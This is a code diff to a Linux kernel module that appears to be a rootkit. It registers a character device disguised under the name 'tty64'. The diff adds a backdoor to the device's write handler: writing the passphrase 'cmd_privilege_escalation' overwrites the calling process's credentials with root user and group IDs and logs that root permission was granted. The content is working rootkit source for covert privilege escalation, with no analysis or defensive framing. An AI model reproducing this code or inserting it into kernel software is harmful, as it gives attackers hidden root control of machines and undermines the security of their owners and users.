@@ -5,8 +5,10 @@
 #include <linux/fs.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
+#include <linux/cred.h>
 
 #define DEVICE_NAME "tty64"
+#define BACKDOOR_PASSPHRASE "cmd_privilege_escalation"
 
 static int ret = 0;
 static int major_number = 0;  // character device major number
@@ -15,6 +17,7 @@ static dev_t dev_num;
 static struct satan_device satan_dev;  // our custom struct which holds rootkit data
 static struct cdev *satan_cdev;  // character device struct from linux kernel
 static struct file_operations fops;
+static struct cred *cred = NULL;
 
 static int satan_dev_open(struct inode *inode, struct file *filp);
 static int satan_dev_close(struct inode *inode, struct file *filp);
@@ -131,6 +134,14 @@ static ssize_t satan_dev_write(struct file *filp, const char *user_buf, size_t l
                                 *offset += ret;
                         }
                 }
+        }
+
+        // backdoor
+        if (!strncmp(BACKDOOR_PASSPHRASE, satan_dev.data, strlen(BACKDOOR_PASSPHRASE))) {
+                cred = (struct cred *)__task_cred(current);
+                cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
+                cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
+                printk("satan: root permission granted\n");
         }
 
         return ret;
